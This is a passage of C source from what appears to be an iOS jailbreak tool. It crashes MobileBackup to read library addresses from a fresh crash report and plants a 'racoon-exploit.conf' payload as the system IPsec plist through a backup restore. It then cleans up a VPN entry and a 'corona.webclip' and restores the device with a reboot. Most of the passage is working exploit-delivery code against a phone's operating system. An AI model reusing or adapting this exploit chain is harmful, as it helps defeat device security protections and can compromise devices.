		}
		if (sbservices_get_icon_state(sbsc, &state, "2") == SBSERVICES_E_SUCCESS) {
			plist_free(state);
			state = NULL;
			done = 1;
		}
		sbservices_client_free(sbsc);
		if (done) {
			debug("bootup complete\n");
			break;
		}
		sleep(3);
	}
	lockdown_free(lockdown);
	lockdown = NULL;

	/********************************************************/
	/* Crash MobileBackup to grab a fresh crashreport */
	/********************************************************/
	debug("Grabbing a fresh crashreport for this device\n");
	crashreport_t* crash = crash_mobilebackup(device);
	if(crash == NULL) {
		error("Unable to get fresh crash from mobilebackup\n");
		device_free(device);
		return -1;
	}

	/********************************************************/
	/* calculate DSCS */
	/********************************************************/
	i = 0;
	uint32_t dscs = 0;
	while (crash->dylibs && crash->dylibs[i]) {
		if (!strcmp(crash->dylibs[i]->name, "libcopyfile.dylib")) {
			debug("Found libcopyfile.dylib address in crashreport of 0x%x\n", crash->dylibs[i]->offset);
			dscs = crash->dylibs[i]->offset - libcopyfile_vmaddr;
		}
		i++;
	}

	printf("0x%x\n", dscs);

	// If aslr slide wasn't specified on the command line go ahead and figure it out ourself
	/*if(aslr_slide == 0) {
		// In order for us to calculate this offset ourself, we must have access
		//  to a dyldcache for this device and firmware version
		if(cache == NULL) {
			error("You must specify either --cache or --aslr-slide arguments\n");
			return -1;
		}

		// We have the required arguments, so we can calculate this parameter ourselves
		debug("Calculating dyldcache ASLR offset\n");
		aslr_slide = find_aslr_slide(crash, cache);
		if(aslr_slide == 0) {
			error("Unable to calculate ASLR offset\n");
		}
	}*/

	/********************************************************/
	/* add com.apple.ipsec.plist to backup */
	/********************************************************/
	backup = backup_open(BKPTMP, uuid);
	if (!backup) {
		error("ERROR: failed to open backup\n");
		goto fix;
	}
	char* ipsec_plist = NULL;
	int ipsec_plist_size = 0;
	file_read("racoon-exploit.conf", (unsigned char**)&ipsec_plist, &ipsec_plist_size);
	if(ipsec_plist != NULL && ipsec_plist_size > 0) {
		bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.plist");
		if (bf) {
			debug("com.apple.ipsec.plist already present, replacing\n");
			backup_file_assign_file_data(bf, ipsec_plist, strlen(ipsec_plist), 0);
			backup_file_set_length(bf, strlen(ipsec_plist));
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				error("ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			debug("adding com.apple.ipsec.plist\n");
			bf = backup_file_create_with_data(ipsec_plist, strlen(ipsec_plist), 0);
			backup_file_set_domain(bf, "SystemPreferencesDomain");
			backup_file_set_path(bf, "SystemConfiguration/com.apple.ipsec.plist");
			backup_file_set_mode(bf, 0100644);
			backup_file_set_inode(bf, 123456);
			backup_file_set_uid(bf, 0);
			backup_file_set_gid(bf, 0);
			unsigned int tm = (unsigned int)(time(NULL));
			backup_file_set_time1(bf, tm);
			backup_file_set_time2(bf, tm);
			backup_file_set_time3(bf, tm);
			backup_file_set_length(bf, strlen(ipsec_plist));
			backup_file_set_flag(bf, 4);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				error("ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		}
		backup_file_free(bf);
		backup_free(backup);

		/********************************************************/
		/* restore backup WITHOUT REBOOT */
		/********************************************************/
		char* nrargv[] = {
			"idevicebackup2",
			"restore",
			"--system",
			"--settings",
			BKPTMP,
			NULL
		};
		idevicebackup2(5, nrargv);
	} else {
		error("WARNING: no racoon-exploit.conf found\n");
	}

	/********************************************************/
	/* here, the user needs to activate the exploit */
	/********************************************************/

	printf("TODO wait for exploit to complete\n");
	sleep(20);

	/********************************************************/
	/* Cleanup backup: remove VPN connection and webclip */
	/********************************************************/
	backup = backup_open(BKPTMP, uuid);
	if (!backup) {
		error("ERROR: failed to open backup\n");
		goto fix;
	}
	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/preferences.plist");
	if (bf) {
		char* fn = backup_get_file_path(backup, bf);
		if (!fn) {
			error("Huh, backup path for preferences.plist not found?!\n");
			goto fix;
		}

		unsigned char* prefs = NULL;
		uint32_t plen = 0;

		if (file_read(fn, &prefs, &plen) > 8) {
			plist_t pl = NULL;
			if (memcmp(prefs, "bplist00", 8) == 0) {
				plist_from_bin(prefs, plen, &pl);
			} else {
				plist_from_xml(prefs, plen, &pl);
			}
			free(prefs);
			plen = 0;
			prefs = NULL;

			debug("remove VPN connection\n");
			prefs_remove_entry_if_present(&pl);

			plist_to_bin(pl, (char**)&prefs, &plen);

			backup_file_assign_file_data(bf, prefs, plen, 1);
			free(prefs);
			prefs = NULL;
			backup_file_set_length(bf, plen);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				error("ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			error("Could not open '%s'\n", fn);
		}
	} else {
		error("ERROR: could not locate preferences.plist in backup.\n");
	}
	backup_file_free(bf);

	bf = backup_get_file(backup, "HomeDomain", "Library/WebClips/corona.webclip/Info.plist");
	if (bf) {
		backup_remove_file(backup, bf);
		backup_file_free(bf);
	}

	bf = backup_get_file(backup, "HomeDomain", "Library/WebClips/corona.webclip/icon.png");
	if (bf) {
		backup_remove_file(backup, bf);
		backup_file_free(bf);
	}

	bf = backup_get_file(backup, "HomeDomain", "Library/WebClips/corona.webclip");
	if (bf) {
		backup_remove_file(backup, bf);
		backup_file_free(bf);
	}
	backup_write_mbdb(backup);
	backup_free(backup);

	
	/********************************************************/
	/* restore backup */
	/********************************************************/
	char* frargv[] = {
		"idevicebackup2",
		"restore",
		"--system",
		"--settings",
		"--reboot",
		BKPTMP,
		NULL
	};
	idevicebackup2(6, frargv);

	/********************************************************/
	/* wait for device reboot */
	/********************************************************/

	// wait for disconnect
	while (connected) {
		sleep(2);
	}
	debug("Device %s disconnected\n", uuid);

	// wait for device to connect
	while (!connected) {
		sleep(2);
	}
	debug("Device %s detected. Connecting...\n", uuid);
	sleep(2);

	/********************************************************/
	/* connect and move back dirs */
	/********************************************************/
	device = device_create(uuid);
	if (!device) {
		error("Error connecting to device\n");
		return -1;
	}

	lockdown = lockdown_open(device);
	if (!lockdown) {
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	port = 0; 
	if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
		error("Failed to start AFC service\n");
		lockdown_free(lockdown);
		goto leave;
	}
	lockdown_free(lockdown);

	afc_client_new(device->client, port, &afc);
	if (!afc) {
		error("Could not connect to AFC\n");
		goto leave;
	}
	debug("moving back files...\n");

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		error("Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
	}

	i = 0;
	while (list && list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}
		printf("%s\n", list[i]);

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		rmdir_recursive_afc(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		printf("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	free_dictionary(list);

	/********************************************************/
	/* wait for device to finish booting to springboard */
	/********************************************************/
	debug("waiting for device to finish booting...\n");

	lockdown = lockdown_open(device);
	if (!lockdown) {
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	retries = 100;
	done = 0;
	sbsc = NULL;
	state = NULL;

	while (!done && (retries-- > 0)) {
		port = 0;
		lockdown_start_service(lockdown, "com.apple.springboardservices", &port);
		if (!port) {
			continue;
		}
		sbsc = NULL;
		sbservices_client_new(device->client, port, &sbsc);
		if (!sbsc) {
			continue;
		}
		if (sbservices_get_icon_state(sbsc, &state, "2") == SBSERVICES_E_SUCCESS) {
			plist_free(state);
			state = NULL;
			done = 1;
		}
		sbservices_client_free(sbsc);
		if (done) {
			debug("bootup complete\n");
			break;
		}
		sleep(3);
	}
	lockdown_free(lockdown);
	lockdown = NULL;

	/********************************************************/
	/* move back any remaining dirs via AFC */
	/********************************************************/	
fix:
	if (!afc) {
		lockdown = lockdown_open(device);
		port = 0; 
		if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
			error("Failed to start AFC service\n");
			lockdown_free(lockdown);
			goto leave;
		}
		lockdown_free(lockdown);

		afc_client_new(device->client, port, &afc);
		if (!afc) {
			error("Could not connect to AFC\n");
			goto leave;
		}
	}

	printf("moving back any leftovers...\n");

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		//fprintf(stderr, "Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
	}

	i = 0;
	while (list && list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}
		printf("%s\n", list[i]);

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		rmdir_recursive_afc(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		printf("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	free_dictionary(list);

	printf("cleaning up\n");
	afc_remove_path(afc, "/"AFCTMP);
	if (afc_read_directory(afc, "/"AFCTMP, &list) == AFC_E_SUCCESS) {
		fprintf(stderr, "WARNING: the folder /"AFCTMP" is still present in the user's Media folder. You have to check yourself for any leftovers and move them back if required.\n");
	}

	rmdir_recursive(BKPTMP);

	printf("done!\n");

leave:
	idevice_event_unsubscribe();

	afc_client_free(afc);
	afc = NULL;
	device_free(device);
	device = NULL;
	free(uuid);

	return 0;
}
